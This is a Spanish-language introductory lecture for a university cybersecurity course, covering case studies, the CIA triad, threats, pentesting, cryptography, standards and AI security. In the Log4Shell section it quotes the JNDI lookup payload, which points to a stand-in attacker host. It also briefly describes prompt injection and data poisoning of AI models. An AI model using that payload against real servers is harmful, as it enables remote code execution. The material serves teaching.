# Presentación Introductoria — Seguridad Informática 2026

Clase inaugural. Panorama de toda la materia: programa, casos reales, conceptos clave por unidad y buenas prácticas.

---

## Programa de la Materia

68 hs · 17 semanas · 2 parciales

| Unidad | Tema |
|--------|------|
| I | Fundamentos de la Seguridad de la Información |
| II | Desafíos de Seguridad para los Usuarios |
| III | Seguridad Ofensiva |
| IV | Seguridad Defensiva |
| V | Introducción a la Criptografía |
| VI | Normativas y Estándares (ISO 27001 · NIST) |
| VII | Seguridad de Inteligencia Artificial |

---

## ¿Por qué importa la Seguridad Informática?

- **$8T** — costo global del cibercrimen en 2023
- **4.5B** — registros de datos expuestos en 2023
- **95%** — de las brechas se deben a error humano
- En Argentina, los ataques de ransomware crecieron un 70% en el último año
- Cada 39 segundos ocurre un ciberataque en algún lugar del mundo

---

## Casos Reales

### Log4Shell (CVE-2021-44228) · 2021

Apache Log4j es una librería de logging usada en millones de sistemas Java. Un atacante podía ejecutar código remoto enviando una cadena de texto maliciosa en un campo de búsqueda o encabezado HTTP.

- **Impacto**: Apple, Twitter, Amazon, Tesla, Minecraft y miles de empresas más. CVSS Score: 10.0. +800.000 intentos de explotación en las primeras 72 horas.
- **Lección**: una sola librería desactualizada puede comprometer sistemas críticos globales. La gestión de dependencias y el parcheo rápido son fundamentales.

```
${jndi:ldap://attacker.com/exploit}   ← la cadena que lo desencadenó todo
```

---

### SolarWinds SUNBURST · 2020

El mayor ataque a la cadena de suministro de software.

| Fecha | Evento |
|-------|--------|
| 2019 | APT29 (Rusia) infiltra los sistemas de build de SolarWinds |
| Mar 2020 | Se distribuye la actualización maliciosa de Orion a ~18.000 organizaciones |
| Dic 2020 | FireEye descubre el backdoor SUNBURST |
| Dic 2020 | Se confirma la brecha en agencias del gobierno de EE.UU: Tesoro, CISA, Pentágono |

- **Lección**: Supply Chain Attack — comprometés 1 → infectás miles. Zero-trust + validación de integridad del software.

---

### MOVEit Transfer (CVE-2023-34362) · 2023

SQL Injection masiva que expuso datos de millones de personas.

- **Vulnerabilidad**: SQL Injection en MOVEit Transfer. El grupo Cl0p explotó un 0-day para ejecutar consultas maliciosas y extraer archivos sensibles.
- **Víctimas**: +2.600 organizaciones (British Airways, Shell, BBC, gobierno de Noruega, sistema de pensiones de Nueva Escocia).
- **Escala**: +83 millones de personas expuestas. Costo estimado: +USD 9.900 millones.
- **Lección**: vulnerabilidades en software de terceros son vectores críticos. Parcheo inmediato y mínimo privilegio habrían reducido enormemente el impacto.

---

### Análisis comparativo

| Caso | Vector | Impacto | Lección Clave |
|------|--------|---------|---------------|
| Log4Shell 2021 | Librería desactualizada | Millones de servidores | Gestión de dependencias y parcheo urgente |
| SolarWinds 2020 | Cadena de suministro | 18.000 organizaciones, gobierno EE.UU. | Zero-trust, verificar integridad del software |
| MOVEit 2023 | SQL Injection (0-day) | 83M personas, 2.600 organizaciones | Mínimo privilegio + parches inmediatos |

**Patrón común: software sin parchear + falta de defensa en profundidad + reacción tardía**

---

## Unidad I — Tríada CIA

| Pilar | Definición | Ejemplo |
|-------|-----------|---------|
| **Confidencialidad** | Solo las personas autorizadas acceden a la información | Mensajes de WhatsApp cifrados extremo a extremo |
| **Integridad** | La información no puede ser modificada sin autorización | Un registro médico no puede ser alterado por terceros |
| **Disponibilidad** | Los sistemas deben estar operativos cuando se los necesita | Un banco online debe funcionar 24/7 |

---

## Unidad I — Ecosistema de Amenazas

| Tipo | Descripción |
|------|-------------|
| **Malware** | Virus, ransomware, troyanos, spyware — software diseñado para dañar o robar |
| **Phishing** | Engaños por email/SMS para robar credenciales o datos bancarios |
| **Ingeniería Social** | Manipulación psicológica para que la víctima entregue información |
| **DDoS** | Ataques que saturan servidores dejándolos sin servicio |
| **Exploits** | Aprovechan vulnerabilidades en software para ganar acceso no autorizado |
| **Insider Threat** | Amenazas internas: empleados malintencionados o negligentes |

---

## Unidad II — Phishing & Ingeniería Social

**Anatomía de un ataque de phishing:**
1. El atacante crea un email falso imitando a tu banco
2. Te crea urgencia: "Tu cuenta será bloqueada en 24h"
3. Incluye un link que parece legítimo pero no lo es
4. Lleva a una web idéntica a la real
5. Ingresás tus credenciales → robadas

**Cómo protegerse:**
- Verificá siempre el dominio del remitente
- No hacés clic en links de emails urgentes
- Activá autenticación de 2 factores (2FA)
- Usá un gestor de contraseñas
- Desconfiá de lo que parece demasiado urgente

---

## Unidad III — Hacking Ético

**Tipos de hackers:**
- **Black Hat**: atacantes maliciosos, buscan robar, dañar o extorsionar
- **White Hat**: hackers éticos contratados para encontrar vulnerabilidades
- **Grey Hat**: actúan sin permiso pero no siempre con malas intenciones

**Fases del Pentesting:**
1. Reconocimiento
2. Escaneo
3. Explotación
4. Post-Explotación
5. Reporte

**OWASP Top 10 (2021):**

| ID | Vulnerabilidad |
|----|---------------|
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | Injection (SQL, NoSQL, OS) |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable & Outdated Components |
| A07 | Identification & Auth Failures |
| A08 | Software & Data Integrity Failures |
| A09 | Security Logging Failures |
| A10 | SSRF |

---

## Unidad IV — Defensa en Profundidad

| Herramienta | Función |
|-------------|---------|
| **Firewall** | Filtra el tráfico de red según reglas definidas |
| **IDS / IPS** | Detecta y bloquea intrusiones en tiempo real |
| **Antimalware** | Escanea y elimina software malicioso |
| **SIEM** | Centraliza logs y detecta comportamientos anómalos |
| **OSINT** | Inteligencia de fuentes abiertas para anticipar amenazas |
| **Análisis Forense** | Investiga incidentes post-ataque buscando evidencia |

**Tipos de malware:**

| Tipo | Descripción |
|------|-------------|
| Ransomware | Cifra archivos y exige rescate (Bitcoin) |
| Virus | Se replica insertándose en otros archivos ejecutables |
| Troyano | Aparenta ser legítimo pero ejecuta código malicioso |
| Spyware | Espía al usuario y roba información sensible |
| Botnet | Red de equipos zombie controlados remotamente |
| Rootkit | Oculta su presencia en el sistema operativo |

---

## Unidad V — Criptografía

**Clave Simétrica:**
- La misma clave cifra Y descifra
- Algoritmos: DES, 3DES, AES
- Más rápida, pero el intercambio de clave es un riesgo
- Ideal para cifrar grandes volúmenes de datos

**Clave Asimétrica:**
- Par de claves: pública (cifra) y privada (descifra)
- Algoritmos: RSA, ECC, Diffie-Hellman
- Más lenta, pero resuelve el problema del intercambio
- Base de HTTPS, firma digital, PKI

> RSA de 2048 bits tardaría miles de millones de años en romperse con computadoras clásicas.

---

## Unidad VI — Normativas y Estándares

**ISO/IEC 27001:2022:**
- Marco para gestionar la seguridad de la información
- Define controles, políticas y procesos
- Requiere análisis de riesgos periódico
- Aplicable a cualquier tipo de organización
- Permite certificación internacional

**NIST Cybersecurity Framework:**

| Fase | Acción |
|------|--------|
| IDENTIFY | Conocé tus activos y riesgos |
| PROTECT | Implementá salvaguardas |
| DETECT | Identificá incidentes |
| RESPOND | Actuá ante los eventos |
| RECOVER | Restaurá los servicios |

---

## Unidad VII — Seguridad en Inteligencia Artificial

**Ataques:**
- **Adversarial Attacks**: entradas diseñadas para engañar modelos de ML (ej: imagen modificada que hace que un auto se clasifique como señal de pare)
- **Data Poisoning**: el atacante contamina los datos de entrenamiento para que el modelo aprenda comportamientos incorrectos
- **Prompt Injection**: instrucciones maliciosas insertadas en el input de un LLM para manipular su comportamiento o filtrar datos

**Otros riesgos:**
- Model Inversion: reconstruir datos de entrenamiento privados
- Membership Inference: detectar si un dato estuvo en el dataset
- Sesgo (Bias): decisiones injustas por datos sesgados

**Principios de IA Segura:**
- Explainability: los modelos deben ser interpretables
- Red-teaming: probar LLMs buscando comportamientos adversos
- Gobernanza: EU AI Act · NIST AI RMF · ISO/IEC 42001

---

## Decálogo de Seguridad Digital

1. **Contraseñas únicas y fuertes** — usá un gestor como Bitwarden o 1Password
2. **Activá el 2FA siempre** — Google Authenticator, SMS o llave física
3. **Actualizá todo** — sistemas, apps, drivers y firmware
4. **Desconfiá de lo urgente** — phishing abusa de la urgencia y el miedo
5. **Cifrá tus datos sensibles** — VeraCrypt, BitLocker, FileVault
6. **Red Wi-Fi pública = riesgo** — usá VPN en redes desconocidas
7. **Backups 3-2-1** — 3 copias, 2 medios distintos, 1 offsite
8. **Revisá permisos de apps** — ¿para qué necesita ubicación una linterna?
9. **Verificá URLs antes de clicar** — hover sobre el link antes de abrirlo
10. **Educación continua** — el factor humano es el eslabón más débil

---

## Conclusiones

- La seguridad informática no es solo tecnología — es cultura, procesos y personas.
- Las amenazas evolucionan constantemente; el aprendizaje continuo es obligatorio.
- La Ciencia de Datos potencia enormemente las capacidades defensivas y de detección.
- El 95% de las brechas involucra error humano: educar es la mejor defensa.
- La IA introduce nuevos vectores (prompt injection, poisoning): la seguridad debe evolucionar.

> "La seguridad perfecta no existe, pero la negligencia es imperdonable."
